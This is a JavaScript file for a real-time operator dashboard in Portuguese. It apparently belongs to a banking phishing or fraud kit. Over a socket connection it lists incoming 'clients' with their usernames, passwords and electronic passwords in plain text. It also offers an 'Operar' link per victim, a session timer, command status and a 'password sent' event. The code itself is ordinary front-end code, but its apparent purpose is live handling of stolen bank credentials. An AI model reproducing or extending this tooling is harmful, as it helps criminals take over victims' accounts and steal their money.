const panel = (() => {
    //private var/functions

    async function register() {
        const form = document.querySelector('.formRegister')

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const data = util.serialize(form)

                const user = await util.post(`/api/user`, JSON.stringify(data), true)

                return util.notify({
                    icon: 'success',
                    title: 'Sucesso',
                    message: `Usuário ${user.name} cadastrado com sucesso`,
                    type: 'success',
                })
            } catch (error) {
                alert(`Erro ao cadastrar usuário`)
                console.log(error)
            }
        })
    }

    function handleReconnect(client) {
        const { id, user, password, updatedAt, status } = client

        const { operator } = client

        const tr = document.querySelector(`tr[data-id="${id}"]`)

        if (!tr) return

        const roleId = tr.querySelector(`th[role="id"]`)
        const roleOperator = tr.querySelector(`strong[role="operator"]`)
        const roleUser = tr.querySelector(`td[role="user"]`)
        const rolePassword = tr.querySelector(`td[role="password"]`)
        const roleType = tr.querySelector(`td[role="type"]`)
        const roleTime = tr.querySelector(`td[role="time"]`)
        const roleCommand = tr.querySelector(`td[role="command"]`)

        roleCommand.innerHTML = status

        let time = new Date() - new Date(updatedAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        roleOperator.innerHTML = operator.name
        roleUser.innerHTML = user
        rolePassword.innerHTML = password
        roleTime.innerHTML = seconds = ('0' + minutes).slice(-2) + ':' + ('0' + seconds).slice(-2)

        function contador() {
            setTimeout(() => {
                if (seconds == 59) {
                    minutes = parseInt(minutes) + 1

                    seconds = ('0' + 1).slice(-2)
                } else {
                    seconds = parseInt(seconds) + 1

                    seconds = ('0' + seconds).slice(-2)
                }

                roleTime.innerHTML = minutes + ':' + seconds

                contador()
            }, 1000)
        }

        clearTimeout(contador)

        contador()
    }

    function createClient(client) {
        const { id, user, password, eletronicPassword, type, createdAt } = client
        const tr = document.createElement('tr')

        tr.dataset.id = id

        tr.innerHTML = `
        <th scope="row" role="id"># ${id}</th>
        <td><strong role="operator">Aguardando OP</strong></td>
        <td><a class="btn btn-success btn-sm" target="blank" href="/operator?client=${id}" role="button">Operar</a></td>
        <td role="user">${user}</td>
        <td role="password">${password}</td>
        <td role="type">${type}</td>
        <td role="time">132:50</td>
        <td role="command">Aguardando Comando</td>
        `

        const roleTime = tr.querySelector('td[role="time"]')

        let time = new Date() - new Date(createdAt)

        time = new Date(time)

        let seconds = time.getSeconds()
        let minutes = time.getMinutes()

        time = time.getMinutes() + ':' + time.getSeconds()

        function clock() {
            setTimeout(() => {
                if (seconds == 59) {
                    minutes = parseInt(minutes) + 1

                    seconds = ('0' + 1).slice(-2)
                } else {
                    seconds = parseInt(seconds) + 1

                    seconds = ('0' + seconds).slice(-2)
                }

                roleTime.innerHTML = minutes + ':' + seconds

                clock()
            }, 1000)
        }

        console.log(`Role created: `, roleTime)

        clock()

        document.querySelector('.productList').prepend(tr)
    }

    function clientEnter() {
        socket.on('reconnectClient', (client) => {
            console.log(`Cliente Reconectou`, client)
            handleReconnect(client)
        })

        socket.on('newClient', createClient)
    }

    function receiver() {
        socket.on('sendPassword', (client) => {
            document.querySelector('.statusOP').innerHTML = `Senha enviada!`
        })

        socket.on('assignClient', (client) => {
            console.log(`Client Received`, client)
            handleReconnect(client)
        })

        socket.on('finish', (client) => {
            return handleReconnect(client)
        })
    }

    return {
        //public var/functions
        clientEnter,
        receiver,
        register,
    }
})()

panel.clientEnter()
panel.receiver()
panel.register()
